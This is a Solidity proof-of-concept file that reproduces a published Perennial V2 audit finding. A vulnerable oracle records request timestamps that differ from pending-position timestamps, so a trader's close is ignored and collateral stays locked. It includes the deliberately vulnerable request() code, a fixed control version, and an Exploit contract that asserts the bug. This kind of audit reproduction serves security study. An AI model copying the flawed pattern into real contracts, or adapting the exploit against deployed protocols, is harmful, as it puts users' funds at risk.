// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 — oracle request timestamp vs pending-position timestamp
    (Sherlock 2023-07, WATCHPUG / panprog, H-1).
    SYNTHETIC, cheatcode-free. Vulnerable request() body is the audited code.
    Root cause: a new pending position is stamped with PythFactory.current(),
    which ceil-divs block.timestamp up to the next granularity boundary, but
    PythOracle.request() pushes block.timestamp. commitRequested writes the
    price at the request key, so settlement's oracle.at(position timestamp)
    is empty and the close is ignored. The long stays open and collateral
    stays in the market. */

library Math {
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : (a - 1) / b + 1;
    }
}

interface IPythOracle {
    function current() external view returns (uint256);
    function request(address account) external;
    function commitRequested(int256 price) external;
    function at(uint256 timestamp) external view returns (int256 price, bool ok);
    function versionList(uint256 index) external view returns (uint256);
}

contract CollateralToken {
    string public name = "Perennial Collateral";
    string public symbol = "COLL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Vulnerable PythOracle.request — audited body, granularity 100 as in the report.
contract PythOracle is IPythOracle {
    uint256 public granularity = 100;
    uint256[] public versionList;
    uint256 public nextVersionIndexToCommit;
    mapping(uint256 => int256) public prices;
    mapping(uint256 => bool) public valid;

    /// @notice PythFactory.current — rounds UP to the next granularity boundary.
    function current() public view returns (uint256) {
        uint256 effectiveGranularity = granularity;
        return Math.ceilDiv(block.timestamp, effectiveGranularity) * effectiveGranularity;
    }

    /// @notice Audited PythOracle.request (perennial-oracle PythOracle.sol).
    ///         onlyAuthorized omitted: this market is the only caller.
    function request(address) external {
        if (versionList.length == 0 || versionList[versionList.length - 1] != block.timestamp) {
            // @> VULN: request key is block.timestamp, not current(), so the price misses the position
            versionList.push(block.timestamp);
        }
    }

    function commitRequested(int256 price) external {
        uint256 versionToCommit = versionList[nextVersionIndexToCommit];
        prices[versionToCommit] = price;
        valid[versionToCommit] = true;
        nextVersionIndexToCommit += 1;
    }

    function at(uint256 timestamp) external view returns (int256 price, bool ok) {
        ok = valid[timestamp];
        price = prices[timestamp];
    }
}

/// @dev Control: request() records current(), the fix from the Sherlock recommendation.
contract PythOracleFixed is IPythOracle {
    uint256 public granularity = 100;
    uint256[] public versionList;
    uint256 public nextVersionIndexToCommit;
    mapping(uint256 => int256) public prices;
    mapping(uint256 => bool) public valid;

    function current() public view returns (uint256) {
        uint256 effectiveGranularity = granularity;
        return Math.ceilDiv(block.timestamp, effectiveGranularity) * effectiveGranularity;
    }

    function request(address) external {
        uint256 nextTimestamp = current();
        if (versionList.length == 0 || versionList[versionList.length - 1] < nextTimestamp) {
            versionList.push(nextTimestamp);
        }
    }

    function commitRequested(int256 price) external {
        uint256 versionToCommit = versionList[nextVersionIndexToCommit];
        prices[versionToCommit] = price;
        valid[versionToCommit] = true;
        nextVersionIndexToCommit += 1;
    }

    function at(uint256 timestamp) external view returns (int256 price, bool ok) {
        ok = valid[timestamp];
        price = prices[timestamp];
    }
}

contract Market {
    // long = 1.000000 in the protocol's 6-decimal fixed point ("long = 1" in the report).
    uint256 public constant POSITION_SIZE = 1_000_000;
    uint256 public constant COLLATERAL = 1_000 ether;

    CollateralToken public token;
    IPythOracle public oracle;

    mapping(address => uint256) public positionLong;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public pendingTimestamp;
    mapping(address => uint256) public pendingLong;
    bool public closeIgnored;

    constructor(CollateralToken token_, IPythOracle oracle_) {
        token = token_;
        oracle = oracle_;
    }

    /// @dev Pending position timestamp comes from oracle.current(); request() is the same call.
    function update(address account, uint256 newLong, uint256 collateralIn) external {
        uint256 currentTimestamp = oracle.current();
        pendingTimestamp[account] = currentTimestamp;
        pendingLong[account] = newLong;
        if (newLong != positionLong[account]) oracle.request(account);

        if (collateralIn != 0 && positionLong[account] == 0) {
            token.transferFrom(msg.sender, address(this), collateralIn);
            collateralOf[account] = collateralIn;
            positionLong[account] = newLong;
        }
    }

    /// @dev Settlement reads oracle.at(position timestamp). A miss ignores the update.
    function settleClose(address account) external {
        (, bool ok) = oracle.at(pendingTimestamp[account]);
        if (!ok) {
            // No price at the rounded position timestamp: the update is ignored.
            closeIgnored = true;
            return;
        }
        positionLong[account] = pendingLong[account];
        uint256 col = collateralOf[account];
        collateralOf[account] = 0;
        closeIgnored = false;
        if (col != 0) token.transfer(account, col);
    }
}

contract Trader {
    CollateralToken public token;
    Market public market;

    constructor(CollateralToken token_, Market market_) {
        token = token_;
        market = market_;
    }

    function open() external {
        uint256 amount = market.COLLATERAL();
        token.approve(address(market), amount);
        market.update(address(this), market.POSITION_SIZE(), amount);
    }

    function close() external {
        market.update(address(this), 0, 0);
    }
}

contract Exploit {
    CollateralToken public token;
    PythOracle public oracle;
    Market public market;
    Trader public trader;

    function run() external {
        token = new CollateralToken(); // nonce 1
        oracle = new PythOracle(); // nonce 2
        market = new Market(token, oracle); // nonce 3
        trader = new Trader(token, market); // nonce 4

        token.mint(address(trader), market.COLLATERAL());
        trader.open();

        // Keeper commits only the requested version (block.timestamp), price $100.
        oracle.commitRequested(100e6);

        trader.close();
        market.settleClose(address(trader));

        uint256 stillOpen = market.positionLong(address(trader));
        uint256 locked = token.balanceOf(address(market));
        require(market.closeIgnored(), "close was applied");
        require(stillOpen == market.POSITION_SIZE(), "position closed");
        require(locked == market.COLLATERAL(), "collateral not locked");
        require(oracle.versionList(0) != oracle.current(), "timestamps matched");
    }
}
